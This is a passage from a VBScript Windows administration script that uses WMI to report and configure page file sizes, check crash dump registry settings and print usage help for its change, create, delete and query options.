                             L_ColHeaderTotalRecommendedSize_Text, L_ColHeaderTotalSize_Text)

    ' Data Lengths  = (15,13,13,19,20,20,20,22)
    arrMaxLengthDrives  = Array(CONST_HOSTNAME_LENGTH, CONST_DRIVENAME_LENGTH, CONST_VOLLABEL_LENGTH, _
                                CONST_PAGEFILENAME_LENGTH, CONST_INTSIZE_LENGTH, CONST_MAXSIZE_LENGTH, _
                                CONST_CURRENTSIZE_LENGTH, CONST_FREESPACE_LENGTH)

    ' Data Lengths  = (15,33,37,40)
    arrMaxLengthSummary = Array(CONST_HOSTNAME_LENGTH,CONST_TOTALMINSIZE_LENGTH,_
                                CONST_TOTALRECSIZE_LENGTH,CONST_TOTALSIZE_LENGTH)

    arrblnNoDisplayDrives  = Array(0,0,0,0,0,0,0,0)
    arrblnNoDisplaySummary = Array(0,0,0,0)

    ' first initialize the array with N/A
    arrResultsDrives  = Array(L_Na_Text,L_Na_Text,L_Na_Text,L_Na_Text,L_Na_Text,L_Na_Text,_
                              L_Na_Text,L_Na_Text)
    arrResultsSummary = Array(L_Na_Text,L_Na_Text,L_Na_Text,L_Na_Text)

    ' build the query
    strQuery = "SELECT * FROM " & CLASS_PAGE_FILE_SETTING

    ' execute the query
    Set objEnumerator = objService.ExecQuery(strQuery, "WQL", 0, null)
    ' check for any errors
    If Err.Number Then
        Err.Clear
        WScript.Echo(L_UnableToRetrieveInfo_ErrorMessage)
        WScript.Quit(EXIT_QUERY_FAIL)
    End If

    ' If no.of pagefile instances are 0 (zero)
    If (objEnumerator.Count = 0) Then
        WScript.Echo(L_NoPageFiles_Message)
        WScript.Quit(EXIT_UNEXPECTED)
    End If

    ReDim arrFinalResultsDrives(0)
    ReDim arrFinalResultsSummary(0)

    WScript.Echo("") ' Blank Line

    ' Loop through all the instances for the first report
    For each objInstance in objEnumerator

        If NOT IsEmpty(objInstance.Name) Then
            strDriveName = Mid(objInstance.Name,1,2)
        End If

        ' check if it is a valid physical drive
        If IsValidPhysicalDrive(objService,strDriveName) Then

            If IsEmpty(objInstance.Name) Then
                arrResultsDrives(1) = L_Na_Text
            Else
                strDriveName = Mid(objInstance.Name,1,2)
                arrResultsDrives(1) = UCase(strDriveName)
            End If

            ' to get the data from Win32_PageFileUsage
            Set objUsageInstance = objService.Get(CLASS_PAGE_FILE_USAGE & "='" & objInstance.Name & "'")

            ' to get the current size
            If Len(objUsageInstance.AllocatedBaseSize) = 0 Then
                arrResultsDrives(6) = L_Na_Text
            Else
                arrResultsDrives(6) = objUsageInstance.AllocatedBaseSize & MEGA_BYTES
                intTotSize = intTotSize + objUsageInstance.AllocatedBaseSize
            End If

            ' to get the data from Win32_LogicalDisk
            Set objDiskDriveInstance = objService.Get(CLASS_LOGICAL_DISK & "='" & strDriveName & "'")

            If Len(objDiskDriveInstance.VolumeName) = 0 Then
                arrResultsDrives(2) = L_Na_Text
            Else
                arrResultsDrives(2) = objDiskDriveInstance.VolumeName
            End If

            If Len(objDiskDriveInstance.SystemName) = 0 Then
                arrResultsDrives(0) = L_Na_Text
            Else
                arrResultsDrives(0) = objDiskDriveInstance.SystemName
                arrResultsSummary(0) = objDiskDriveInstance.SystemName
            End If

            If (objDiskDriveInstance.FreeSpace) Then
                arrResultsDrives(7) = Int(objDiskDriveInstance.FreeSpace/CONVERSION_FACTOR) + Int(objUsageInstance.AllocatedBaseSize) &_
                MEGA_BYTES
            Else
                arrResultsDrives(7) = L_Na_Text
            End If

            If IsEmpty(objInstance.Name) Then
                arrResultsDrives(3) = L_Na_Text
            Else
                arrResultsDrives(3) = objInstance.Name
            End If

            If objInstance.InitialSize Then
                arrResultsDrives(4) = objInstance.InitialSize & MEGA_BYTES
            Else
                arrResultsDrives(4) = L_Na_Text
            End If

            If objInstance.MaximumSize Then
                arrResultsDrives(5) = objInstance.MaximumSize & MEGA_BYTES
            Else
                arrResultsDrives(5) = L_Na_Text
            End If

            arrFinalResultsDrives(0) = arrResultsDrives

            Call component.showResults(arrHeaderDrives, arrFinalResultsDrives, arrMaxLengthDrives, _
                                       strFormat, blnPrintHeaderDrives, arrblnNoDisplayDrives)
            blnPrintHeaderDrives = FALSE

        End If

    Next
    WScript.Echo("")

    ' Display the summary report
    arrResultsSummary(1) = INITIAL_SIZE_LB & MEGA_BYTES
    Set objMemSizeInstance = objService.Get(CLASS_COMPUTER_SYSTEM & "='" & arrResultsDrives(0) & "'")
    If objMemSizeInstance.TotalPhysicalMemory Then
        intRecommendedSize = Int(Int(objMemSizeInstance.TotalPhysicalMemory/CONVERSION_FACTOR)* SIZE_FACTOR)
        arrResultsSummary(2) = intRecommendedSize & MEGA_BYTES
    Else
        arrResultsSummary(2) = L_Na_Text
    End If

    arrResultsSummary(3) = intTotSize & MEGA_BYTES
    arrFinalResultsSummary(0) = arrResultsSummary

    Call component.showResults(arrHeaderSummary, arrFinalResultsSummary, arrMaxLengthSummary, strFormat, _
                               blnPrintHeaderSummary,arrblnNoDisplaySummary)
    blnPrintHeaderSummary = FALSE

End Sub


'******************************************************************************
'* Function: IsValidPhysicalDrive
'*
'* Purpose:  To check if the specified drive is a valid physical drive.
'*           This check is done only for Win2K builds and NOT for Whistler Builds.
'*
'* Input:
'*  [in]     objServiceParam      service object to maintain wmi connection.
'*  [in]     strDriveName         drive name whose validity has to be checked.
'*
'* Output:   Returns TRUE or FALSE
'*             TRUE  - when the drive is a valid physical drive.
'*             FALSE - when the drive is not a valid physical drive.
'*
'******************************************************************************

Private Function IsValidPhysicalDrive ( ByVal objServiceParam, _
                                        ByVal strDriveName )

    ON ERROR RESUME NEXT
    Err.Clear

    CONST WIN2K_MAJOR_VERSION = 5000
    CONST WINXP_MAJOR_VERSION = 5001

    Dim strQuery            ' to store the query to be executed
    Dim objEnum             ' collection object
    Dim objInstance         ' instance object
    Dim strValidDrives      ' to store all valid physical drives
    Dim strVersion          ' to store the OS version
    Dim arrVersionElements  ' to store the OS version elements
    Dim CurrentMajorVersion ' the major version number

    strValidDrives = ""
    ' by default set it to true
    IsValidPhysicalDrive = TRUE

    strquery = "Select * From " & CLASS_OPERATING_SYSTEM
    set objEnum = objServiceParam.ExecQuery(strQuery,"WQL",48,null)

    For each objInstance in objEnum
        strVersion= objInstance.Version
    Next

    ' OS Version : 5.1.xxxx(Whistler), 5.0.xxxx(Win2K)
    arrVersionElements  = split(strVersion,".")
    ' converting to major version
    CurrentMajorVersion = arrVersionElements(0) * 1000 + arrVersionElements(1)

    ' Determine the OS Type
    ' If the OS is Whistler, then NO NEED to validate.
    ' If the OS is Win2K, then validate the drive name.
    If CInt(CurrentMajorVersion) < CInt(WINXP_MAJOR_VERSION) Then

        strQuery = "Select * From " & CLASS_PERFDISK_PHYSICAL_DISK
        Set objEnum = objServiceParam.ExecQuery(strQuery, "WQL", 0, null)

        For each objInstance in objEnum
            ' get all the instance except the last one
            If (objInstance.Name <> "_Total") Then
                strValidDrives = strValidDrives & " " & objInstance.Name
            End If
        Next

        ' check if the specified drive is present in the list of valid physical drives
        If Instr(strValidDrives, UCase(strDriveName)) = 0 Then
            IsValidPhysicalDrive = FALSE
        End If

    End If

End Function


'******************************************************************************
'* Function: getFreeSpaceOnDisk
'*
'* Purpose:  To get the Free Space for the Specified Disk
'*
'* Input:
'*  [in]     strDriveName         drive name whose free space is needed 
'*  [in]     objServiceParam      service object to maintain wmi connection
'*
'* Output:   Returns the free space (in MB) on the specified disk.
'*
'******************************************************************************

Private Function getFreeSpaceOnDisk(ByVal strDriveName, ByVal objServiceParam)

    ON ERROR RESUME NEXT
    Err.Clear

    Dim objValidDiskInst

    Set objValidDiskInst = objServiceParam.Get(CLASS_LOGICAL_DISK & "='" & strDriveName & "'")
    If Err.Number Then
        Err.Clear
        WScript.Echo(L_UnableToRetrieveInfo_ErrorMessage)
        WScript.Quit(EXIT_QUERY_FAIL)
    End If

    getFreeSpaceOnDisk = Int(objValidDiskInst.FreeSpace/CONVERSION_FACTOR)

End Function


'******************************************************************************
'* Function: getCurrentPageFileSize
'*
'* Purpose:  To get the current pagefile size on the specified drive
'*
'* Input:
'*  [in]     objService       wbem service object
'*  [in]     objInstance      instance of win32_pagefilesetting
'*
'* Output:   current pagefile size
'*
'******************************************************************************

Private Function getCurrentPageFileSize(ByVal objService, ByVal objInstance)

    ON ERROR RESUME NEXT
    Err.Clear

    Dim objUsageInstance

    ' get the data from Win32_PageFileUsage
    Set objUsageInstance = objService.Get(CLASS_PAGE_FILE_USAGE & "='" & objInstance.Name & "'")

    ' return the current size ( allocated base size )
    getCurrentPageFileSize = objUsageInstance.AllocatedBaseSize

End Function


'******************************************************************************
'* Function: GetDiskSize
'*
'* Purpose:  To get the disk size for the specified drive
'*
'* Input:
'*  [in]     strDriveName         drive name whose free space is needed
'*  [in]     objServiceParam      service object to maintain wmi connection
'*
'* Output:   Returns the total disk size in MB.
'*
'******************************************************************************

Private Function GetDiskSize(ByVal strDriveName, ByVal objServiceParam)

    ON ERROR RESUME NEXT
    Err.Clear

    Dim objValidDiskInst      ' object to store valid disk name 

    Set objValidDiskInst = objServiceParam.Get(CLASS_LOGICAL_DISK & "='" & strDriveName & "'")

    If Err.Number Then
        Err.Clear
        WScript.Echo(L_UnableToRetrieveInfo_ErrorMessage)
        WScript.Quit(EXIT_QUERY_FAIL)
    End If

    GetDiskSize = Int(objValidDiskInst.Size / CONVERSION_FACTOR)

End Function


'******************************************************************************
'* Function: GetPhysicalMemorySize
'*
'* Purpose:  To get the physical memory size.
'*
'* Input:
'*  [in]     strHostName              host name to connect to
'*  [in]     objServiceParam          service object to maintain wmi connection
'*
'* Output:   Returns the physical memory size in MB.
'*
'******************************************************************************

Private Function GetPhysicalMemorySize( ByVal strHostName, ByVal objServiceParam )

    ON ERROR RESUME NEXT
    Err.Clear

    Dim objMemSizeInstance          ' to store memory size
    Dim intReturnValue              ' to store return value

    Set objMemSizeInstance = objServiceParam.Get(CLASS_COMPUTER_SYSTEM & "='" & strHostName & "'")
    If Err.Number Then
        Err.Clear
        WScript.Echo L_UnableToRetrieveInfo_ErrorMessage
        WScript.Quit EXIT_QUERY_FAIL
    End If

    If objMemSizeInstance.TotalPhysicalMemory Then
        intReturnValue = Int(objMemSizeInstance.TotalPhysicalMemory/CONVERSION_FACTOR)
        GetPhysicalMemorySize = intReturnValue
    End If

End Function


'******************************************************************************
'* Function: getMaxSizeUB
'*
'* Purpose:  To get the allowed upper bound for maximum size
'*
'* Input:
'*  [in]     objServiceParam          service object to maintain wmi connection
'*
'* Output:   Returns the upper bound for maximum size
'*
'******************************************************************************

Private Function getMaxSizeUB(objServiceParam)

    ON ERROR RESUME NEXT
    Err.Clear

    CONST PROCESSOR_X86_BASED  = "X86"
    CONST PROCESSOR_IA64_BASED = "IA64"

    Dim objInstance         ' object instance
    Dim intReturnValue      ' to store return value
    Dim strProcessorType    ' to store the processor type
    Dim strQuery            ' to store the query
    Dim objEnum             ' collection of objects

    getMaxSizeUB     = 0

    strQuery = "Select * From " & CLASS_COMPUTER_SYSTEM

    Set objEnum = objServiceParam.ExecQuery(strQuery,"WQL",48,null)
    If Err.Number Then
        Err.Clear
        WScript.Echo L_UnableToRetrieveInfo_ErrorMessage
        WScript.Quit EXIT_QUERY_FAIL
    End If

    ' The following code will handle only single processor environment

    For each objInstance in objEnum
        strProcessorType = objInstance.SystemType
    Next

    ' check if its a 32-bit processor
    If InStr( UCase(strProcessorType),PROCESSOR_X86_BASED ) > 0 Then
        getMaxSizeUB = 4096
    End If

    ' check if its a 64-bit processor
    If Instr( UCase(strProcessorType),PROCESSOR_IA64_BASED ) > 0 Then
        getMaxSizeUB = 33554432
    End If

End Function

'******************************************************************************
'* Function: GetCrashDumpSetting
'*
'* Purpose:  To get the Crash Dump Settings for the machine specified
'*
'* Input:
'*  [in]    strUserNameParam        user name to connect to the machine
'*  [in]    strPasswordParam        password for the user
'*  [in]    strMachineParam         machine to get crash dump settings for
'*
'* Output:  Returns the current crash dump setting value [ 0,1,2,3 ]
'*            0 - None
'*            1 - Complete Memory Dump
'*            2 - Kernel Memory Dump
'*            3 - Small Memory Dump
'*
'******************************************************************************

Private Function GetCrashDumpSetting( ByVal strUserNameParam, _
                                      ByVal strPasswordParam, _
                                      ByVal strMachineParam   )

    ON ERROR RESUME NEXT
    Err.Clear

    CONST CONST_NAMESPACE_DEFAULT     = "root\default"      ' name space to connect to
    CONST CONST_HKEY_LOCAL_MACHINE    = 2147483650          ' registry value for HKEY_LOCAL_MACHINE
    CONST CONST_KEY_VALUE_NAME        = "CrashDumpEnabled"  ' value name to be retrieved
    CONST CONST_STD_REGISTRY_PROVIDER = "StdRegProv"        ' standard registry provider
    ' the Sub Key Name
    CONST CONST_CRASH_DUMP_REGKEY     = "SYSTEM\CurrentControlSet\Control\CrashControl"

    Dim objInstance          ' to store the object instance
    Dim objService           ' service object
    Dim intCrashDumpValue    ' to store the crash dump setting value
    Dim intReturnVal         ' to store return value

    ' connect to the name space
    If NOT component.wmiConnect(CONST_NAMESPACE_DEFAULT , _
                      strUserNameParam   , _
                      strPasswordParam   , _
                      strMachineParam    , _
                      blnLocalConnection , _
                      objService  ) Then
        WScript.Echo(L_HintCheckConnection_Message)
        WScript.Quit(EXIT_METHOD_FAIL)
    End If

    ' get the instance of the Standard Registry Provider
    Set objInstance = objService.Get(CONST_STD_REGISTRY_PROVIDER)

    ' get the key value for from the registry
    intReturnVal = objInstance.GetDWORDValue( CONST_HKEY_LOCAL_MACHINE, _
                                              CONST_CRASH_DUMP_REGKEY, _
                                              CONST_KEY_VALUE_NAME, _
                                              intCrashDumpValue )
    ' check if any error has occured
    If Err.Number <> 0 Then
        Err.Clear
        WScript.Echo(L_FailCreateObject_ErrorMessage)
        WScript.Quit(EXIT_INVALID_PARAM)
    End If

    ' check for the return value after registry is accessed.
    If intReturnVal = 0 Then
        GetCrashDumpSetting = CInt(intCrashDumpValue)
    Else
        WScript.Echo(L_FailCreateObject_ErrorMessage)
        WScript.Quit(EXIT_INVALID_PARAM)
    End If

End Function


' Function used to get the reply in y/n from the user
'******************************************************************************
'* Function: getReply
'*
'* Purpose:  To get reply from the user
'*
'* Input:    None
'*
'* Output:   Prompts for a warning message and accepts the user's choice [y/n]
'*           
'******************************************************************************
Private Function getReply()

    ON ERROR RESUME NEXT
    Err.Clear

    Dim objStdIn     ' to store value from standard input
    Dim strReply     ' to store the user reply

    WScript.Echo(L_PromptForContinueAnyWay_Message)

    Set objStdIn = WScript.StdIn
    
    If Err.Number Then
        Err.Clear
        WScript.Echo(L_FailCreateObject_ErrorMessage)
        WScript.Quit(EXIT_INVALID_PARAM)
    End If

    strReply = objStdIn.ReadLine()
    getReply = Trim(strReply)

End Function


'******************************************************************************
'* Function: isCrashDumpValueSet
'*
'* Purpose:  To check if the crash dump value is set
'*
'* Input:
'*  [in]     intCrashDumpParam       crash dump setting value
'*  [in]     intIntSizeParam         initial size of the pagefile
'*  [in]     intMemSizeParam         physical memory size
'*  [in]     strVolume               drive/volume name
'*
'* Output:   Returns TRUE or FALSE
'*
'******************************************************************************

Private Function isCrashDumpValueSet( ByVal intCrashDumpParam,_
                                      ByVal intIntSizeParam,  _
                                      ByVal intMemSizeParam,  _
                                      ByVal strVolume )

    ON ERROR RESUME NEXT
    Err.Clear

    ' Constants for Crash Dump Settings
    CONST NO_MEMORY_DUMP       = 0
    CONST COMPLETE_MEMORY_DUMP = 1
    CONST KERNEL_MEMORY_DUMP   = 2
    CONST SMALL_MEMORY_DUMP    = 3

    Dim strReply        ' to store user reply
    Dim intSizeValue    ' to store the size value used for comparison

    ' default value is NO [n]
    strReply = L_UserReplyNo_Text

    Select Case CInt(intCrashDumpParam)

        Case COMPLETE_MEMORY_DUMP
            If CInt(intIntSizeParam) < CInt(intMemSizeParam) Then
                component.VBPrintf CrashDumpSettingWarningMessage, Array(UCase(strVolume),CInt(intMemSizeParam) & MEGA_BYTES)
                ' Ask for choice until a yes[y] or no[n] is given
                Do
                    strReply = getReply()
                    If Trim(LCase(strReply)) = L_UserReplyYes_Text Then
                        isCrashDumpValueSet = TRUE
                    ElseIf Trim(LCase(strReply)) = L_UserReplyNo_Text Then
                        isCrashDumpValueSet = FALSE
                    Else
                        WScript.Echo(L_InvalidUserReply_ErrorMessage)
                    End If
                Loop Until (Trim(LCase(strReply)) = L_UserReplyYes_Text OR Trim(LCase(strReply)) = L_UserReplyNo_Text)
            Else
                isCrashDumpValueSet = TRUE
            End If

        Case KERNEL_MEMORY_DUMP

            ' check if RAM size is less than or equal to 128 MB
            If CInt(intMemSizeParam) <= 128 Then
                ' assign size value to be checked to 50 MB
                intSizeValue = 50
            Else
                ' check if RAM size is less than or equal to 4 GB
                If CInt(intMemSizeParam) <= 4096 Then
                    ' assign size value to be checked to 200 MB
                    intSizeValue = 200
                Else
                    ' check if RAM size is less than or equal to 8 GB
                    If CInt(intMemSizeParam) <= 8192 Then
                        ' assign size value to be checked to 400 MB
                        intSizeValue = 400
                    Else
                        ' assign size value to be checked to 800 MB
                        intSizeValue = 800
                    End If
                End If
            End If

            If CInt(intIntSizeParam) < CInt(intSizeValue) Then
                component.VBPrintf CrashDumpSettingWarningMessage, Array(UCase(strVolume),intSizeValue & MEGA_BYTES)
                ' Ask for choice until a yes[y] or no[n] is given
                Do
                    strReply = getReply()
                    If Trim(LCase(strReply)) = L_UserReplyYes_Text Then
                        isCrashDumpValueSet = TRUE
                    ElseIf Trim(LCase(strReply)) = L_UserReplyNo_Text Then
                        isCrashDumpValueSet = FALSE
                    Else
                        WScript.Echo(L_InvalidUserReply_ErrorMessage)
                    End If
                Loop Until (Trim(LCase(strReply)) = L_UserReplyYes_Text OR Trim(LCase(strReply)) = L_UserReplyNo_Text)
            Else
                isCrashDumpValueSet = TRUE
            End If

        Case SMALL_MEMORY_DUMP

            ' initial size should not be less than 64 KB ( less than or equal to 0 MB )
            If CInt(intIntSizeParam) <= 0 Then
                component.VBPrintf CrashDumpSettingWarningMessage, Array(UCase(strVolume),"64 KB")
                ' Ask for choice until a yes[y] or no[n] is given
                Do
                    strReply = getReply()
                    If Trim(LCase(strReply)) = L_UserReplyYes_Text Then
                        isCrashDumpValueSet = TRUE
                    ElseIf Trim(LCase(strReply)) = L_UserReplyNo_Text Then
                        isCrashDumpValueSet = FALSE
                    Else
                        WScript.Echo(L_InvalidUserReply_ErrorMessage)
                    End If
                Loop Until (Trim(LCase(strReply)) = L_UserReplyYes_Text OR Trim(LCase(strReply)) = L_UserReplyNo_Text)
            Else
                isCrashDumpValueSet = TRUE
            End If

        Case NO_MEMORY_DUMP

            ' Crash Dump values 0 has no problem
            isCrashDumpValueSet = TRUE

    End Select

End Function


'******************************************************************************
'* Sub:     typeMessage
'*
'* Purpose: To print the type usage messages relevent to the main option 
'*          selected.
'*
'* Input:   The main option selected.
'*
'* Output:  Prints "type..usage" messages for the main option selected.
'*
'******************************************************************************

Sub typeMessage(ByVal intMainOption)

    ON ERROR RESUME NEXT
    Err.Clear

    Select Case CInt(intMainOption)

        Case CONST_CHANGE_OPTION
            component.VBPrintf L_TypeChangeUsage_Message,Array(UCase(WScript.ScriptName))
        Case CONST_CREATE_OPTION
            component.VBPrintf L_TypeCreateUsage_Message,Array(UCase(WScript.ScriptName))
        Case CONST_DELETE_OPTION
            component.VBPrintf L_TypeDeleteUsage_Message,Array(UCase(WScript.ScriptName))
        Case CONST_QUERY_OPTION
            component.VBPrintf L_TypeQueryUsage_Message,Array(UCase(WScript.ScriptName))
        Case Else
            component.VBPrintf L_TypeUsage_Message,Array(UCase(WScript.ScriptName))

    End Select

End Sub


'******************************************************************************
'* Sub:     ShowUsage
'*
'* Purpose: Shows the correct usage to the user.
'*
'* Input:   None
'*
'* Output:  Help messages are displayed on screen.
'*
'******************************************************************************
Sub ShowUsage()

    WScript.Echo vbCr                                   ' Line 1
    WScript.Echo( L_ShowUsageLine02_Text )              ' Line 2
    WScript.Echo vbCr                                   ' Line 3
    WScript.Echo( L_UsageDescription_Text )             ' Line 4
    WScript.Echo( L_ShowUsageLine05_Text )              ' Line 5
    WScript.Echo( L_ShowUsageLine06_Text )              ' Line 6
    WScript.Echo vbCr                                   ' Line 7
    WScript.Echo( L_ShowUsageLine08_Text )              ' Line 8
    WScript.Echo( L_ShowUsageLine09_Text )              ' Line 9
    WScript.Echo( L_ShowUsageLine10_Text )              ' Line 10
    WScript.Echo vbCr                                   ' Line 11
    WScript.Echo( L_ShowUsageLine12_Text )              ' Line 12
    WScript.Echo vbCr                                   ' Line 13
    WScript.Echo( L_ShowUsageLine14_Text )              ' Line 14
    WScript.Echo vbCr                                   ' Line 15
    WScript.Echo( L_ShowUsageLine16_Text )              ' Line 16
    WScript.Echo( L_ShowUsageLine17_Text )              ' Line 17
    WScript.Echo vbCr                                   ' Line 18
    WScript.Echo( L_ShowUsageLine19_Text )              ' Line 19
    WScript.Echo( L_ShowUsageLine20_Text )              ' Line 20
    WScript.Echo( L_ShowUsageLine21_Text )              ' Line 21
    WScript.Echo( L_ShowUsageLine22_Text )              ' Line 22
    WScript.Echo( L_ShowUsageLine23_Text )              ' Line 23
    WScript.Echo( L_ShowUsageLine24_Text )              ' Line 24
    WScript.Echo( L_ShowUsageLine25_Text )              ' Line 25

End Sub


'******************************************************************************
'* Sub:     ShowChangeUsage
'*
'* Purpose: Shows the correct usage to the user.
'*
'* Input:   None
'*
'* Output:  Help messages for the /Change o ption are displayed on screen.
'*
'******************************************************************************
Sub ShowChangeUsage()

    WScript.Echo vbCr                                   ' Line 1
    WScript.Echo( L_ShowChangeUsageLine02_Text )        ' Line 2
    WScript.Echo( L_ShowChangeUsageLine03_Text )        ' Line 3
    WScript.Echo( L_ShowChangeUsageLine04_Text )        ' Line 4
    WScript.Echo vbCr                                   ' Line 5
    WScript.Echo( L_UsageDescription_Text )             ' Line 6
    WScript.Echo( L_ShowChangeUsageLine07_Text )        ' Line 7
    WScript.Echo vbCr                                   ' Line 8
    WScript.Echo( L_UsageParamList_Text )               ' Line 9
    WScript.Echo( L_UsageMachineName_Text )             ' Line 10
    WScript.Echo vbCr                                   ' Line 11
    WScript.Echo( L_UsageUserNameLine1_Text )           ' Line 12
    WScript.Echo( L_UsageUserNameLine2_Text )           ' Line 13
    WScript.Echo vbCr                                   ' Line 14
    WScript.Echo( L_UsagePasswordLine1_Text )           ' Line 15
    WScript.Echo( L_UsagePasswordLine2_Text )           ' Line 16
    WScript.Echo vbCr                                   ' Line 17
    WScript.Echo( L_ShowChangeUsageLine18_Text )        ' Line 18
    WScript.Echo( L_ShowChangeUsageLine19_Text )        ' Line 19
    WScript.Echo vbCr                                   ' Line 20
    WScript.Echo( L_ShowChangeUsageLine21_Text )        ' Line 21
    WScript.Echo( L_ShowChangeUsageLine22_Text )        ' Line 22
    WScript.Echo vbCr                                   ' Line 23
    WScript.Echo( L_ShowChangeUsageLine24_Text )        ' Line 24
    WScript.Echo( L_ShowChangeUsageLine25_Text )        ' Line 25
    WScript.Echo( L_ShowChangeUsageLine26_Text )        ' Line 26
    WScript.Echo( L_ShowChangeUsageLine27_Text )        ' Line 27
    WScript.Echo vbCr                                   ' Line 28
    WScript.Echo( L_UsageExamples_Text )                ' Line 29
    WScript.Echo( L_ShowChangeUsageLine30_Text )        ' Line 30
    WScript.Echo( L_ShowChangeUsageLine31_Text )        ' Line 31
    WScript.Echo( L_ShowChangeUsageLine32_Text )        ' Line 32
    WScript.Echo( L_ShowChangeUsageLine33_Text )        ' Line 33
    WScript.Echo( L_ShowChangeUsageLine34_Text )        ' Line 34
    WScript.Echo( L_ShowChangeUsageLine35_Text )        ' Line 35

End Sub


'******************************************************************************
'* Sub:     ShowCreateUsage
'*
'* Purpose: Shows the correct usage to the user.
'*
'* Input:   None
'*
'* Output:  Help messages for the /Create option are displayed on screen.
'*
'******************************************************************************
Sub ShowCreateUsage()

    WScript.Echo vbCr                                   ' Line 1
    WScript.Echo( L_ShowCreateUsageLine02_Text )        ' Line 2
    WScript.Echo( L_ShowCreateUsageLine03_Text )        ' Line 3
    WScript.Echo( L_ShowCreateUsageLine04_Text )        ' Line 4
    WScript.Echo vbCr                                   ' Line 5
    WScript.Echo( L_UsageDescription_Text )             ' Line 6
    WScript.Echo( L_ShowCreateUsageLine07_Text )        ' Line 7
    WScript.Echo vbCr                                   ' Line 8
    WScript.Echo( L_UsageParamList_Text )               ' Line 9
    WScript.Echo( L_UsageMachineName_Text )             ' Line 10
    WScript.Echo vbCr                                   ' Line 11
    WScript.Echo( L_UsageUserNameLine1_Text )           ' Line 12
    WScript.Echo( L_UsageUserNameLine2_Text )           ' Line 13
    WScript.Echo vbCr                                   ' Line 14
    WScript.Echo( L_UsagePasswordLine1_Text )           ' Line 15
    WScript.Echo( L_UsagePasswordLine2_Text )           ' Line 16
    WScript.Echo vbCr                                   ' Line 17
    WScript.Echo( L_ShowCreateUsageLine18_Text )        ' Line 18
    WScript.Echo( L_ShowCreateUsageLine19_Text )        ' Line 19
    WScript.Echo vbCr                                   ' Line 20
    WScript.Echo( L_ShowCreateUsageLine21_Text )        ' Line 21
    WScript.Echo( L_ShowCreateUsageLine22_Text )        ' Line 22
    WScript.Echo vbCr                                   ' Line 23
    WScript.Echo( L_ShowCreateUsageLine24_Text )        ' Line 24
    WScript.Echo( L_ShowCreateUsageLine25_Text )        ' Line 25
    WScript.Echo( L_ShowCreateUsageLine26_Text )        ' Line 26
    WScript.Echo( L_ShowCreateUsageLine27_Text )        ' Line 27
    WScript.Echo vbCr                                   ' Line 28
    WScript.Echo( L_UsageExamples_Text )                ' Line 29
    WScript.Echo( L_ShowCreateUsageLine30_Text )        ' Line 30
    WScript.Echo( L_ShowCreateUsageLine31_Text )        ' Line 31
    WScript.Echo( L_ShowCreateUsageLine32_Text )        ' Line 32
    WScript.Echo( L_ShowCreateUsageLine33_Text )        ' Line 33
    WScript.Echo( L_ShowCreateUsageLine34_Text )        ' Line 34
    WScript.Echo( L_ShowCreateUsageLine35_Text )        ' Line 35

End Sub


'******************************************************************************
'* Sub:     ShowDeleteUsage
'*
'* Purpose: Shows the correct usage to the user.
'*
'* Input:   None
'*
'* Output:  Help messages for the /Delete option are displayed on screen.
'*
'******************************************************************************
Sub ShowDeleteUsage()

    WScript.Echo vbCr                                   ' Line 1
    WScript.Echo( L_ShowDeleteUsageLine02_Text )        ' Line 2
    WScript.Echo( L_ShowDeleteUsageLine03_Text )        ' Line 3
    WScript.Echo vbCr                                   ' Line 4
    WScript.Echo( L_UsageDescription_Text )             ' Line 5
    WScript.Echo( L_ShowDeleteUsageLine06_Text )        ' Line 6
    WScript.Echo vbCr                                   ' Line 7
    WScript.Echo( L_UsageParamList_Text )               ' Line 8
    WScript.Echo( L_UsageMachineName_Text )             ' Line 9
    WScript.Echo vbCr                                   ' Line 10
    WScript.Echo( L_UsageUserNameLine1_Text )           ' Line 11
    WScript.Echo( L_UsageUserNameLine2_Text )           ' Line 12
    WScript.Echo vbCr                                   ' Line 13
    WScript.Echo( L_UsagePasswordLine1_Text )           ' Line 14
    WScript.Echo( L_UsagePasswordLine2_Text )           ' Line 15
    WScript.Echo vbCr                                   ' Line 16
    WScript.Echo( L_ShowDeleteUsageLine17_Text )        ' Line 17
    WScript.Echo( L_ShowDeleteUsageLine18_Text )        ' Line 18
    WScript.Echo( L_ShowDeleteUsageLine19_Text )        ' Line 19
    WScript.Echo vbCr                                   ' Line 20
    WScript.Echo( L_UsageExamples_Text )                ' Line 21
    WScript.Echo( L_ShowDeleteUsageLine22_Text )        ' Line 22
    WScript.Echo( L_ShowDeleteUsageLine23_Text )        ' Line 23
    WScript.Echo( L_ShowDeleteUsageLine24_Text )        ' Line 24
    WScript.Echo( L_ShowDeleteUsageLine25_Text )        ' Line 25

End Sub


'******************************************************************************
'* Sub:     ShowQueryUsage
'*
'* Purpose: Shows the correct usage to the user.
'*
'* Input:   None
'*
'* Output:  Help messages for the /Query option are displayed on screen.
'*
'******************************************************************************
Sub ShowQueryUsage()

    WScript.Echo vbCr                                   ' Line 1
    WScript.Echo( L_ShowQueryUsageLine02_Text )         ' Line 2
    WScript.Echo( L_ShowQueryUsageLine03_Text )         ' Line 3
    WScript.Echo vbCr                                   ' Line 4
    WScript.Echo( L_UsageDescription_Text )             ' Line 5
    WScript.Echo( L_ShowQueryUsageLine06_Text )         ' Line 6
    WScript.Echo vbCr                                   ' Line 7
    WScript.Echo( L_UsageParamList_Text )               ' Line 8
    WScript.Echo( L_UsageMachineName_Text )             ' Line 9
    WScript.Echo vbCr                                   ' Line 10
    WScript.Echo( L_UsageUserNameLine1_Text )           ' Line 11
    WScript.Echo( L_UsageUserNameLine2_Text )           ' Line 12
    WScript.Echo vbCr                                   ' Line 13
    WScript.Echo( L_UsagePasswordLine1_Text )           ' Line 14
    WScript.Echo( L_UsagePasswordLine2_Text )           ' Line 15
    WScript.Echo vbCr                                   ' Line 16
    WScript.Echo( L_ShowQueryUsageLine17_Text )         ' Line 17
    WScript.Echo( L_ShowQueryUsageLine18_Text )         ' Line 18
    WScript.Echo( L_ShowQueryUsageLine19_Text )         ' Line 19
    WScript.Echo vbCr                                   ' Line 20
    WScript.Echo( L_UsageExamples_Text )                ' Line 21
    WScript.Echo( L_ShowQueryUsageLine22_Text )         ' Line 22
    WScript.Echo( L_ShowQueryUsageLine23_Text )         ' Line 23
    WScript.Echo( L_ShowQueryUsageLine24_Text )         ' Line 24
    WScript.Echo( L_ShowQueryUsageLine25_Text )         ' Line 25
    WScript.Echo( L_ShowQueryUsageLine26_Text )         ' Line 26
    WScript.Echo( L_ShowQueryUsageLine27_Text )         ' Line 27

End Sub


'+----------------------------------------------------------------------------+
'|                            End of the Script                               |
'+----------------------------------------------------------------------------+     '----------------------------------------------------------------------
'
